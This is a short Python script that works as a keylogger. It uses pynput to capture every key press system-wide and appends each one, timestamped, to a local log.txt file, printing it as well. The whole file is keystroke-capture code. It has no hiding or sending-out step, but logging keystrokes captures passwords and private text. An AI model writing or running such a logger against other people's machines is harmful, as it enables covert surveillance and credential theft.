from pynput.keyboard import Key, Listener
import datetime

#discard = "Key.upKey.down.leftKey.right"

def on_press(key):
    #if(str(key) not in discard):
    a = open("log.txt", "a") #saves everyntime
    a.write(str(datetime.datetime.now()) + str(key) + "\n")
    a.close()
    print('{0} pressed'.format(key))

with Listener(on_press=on_press) as listener: listener.join()
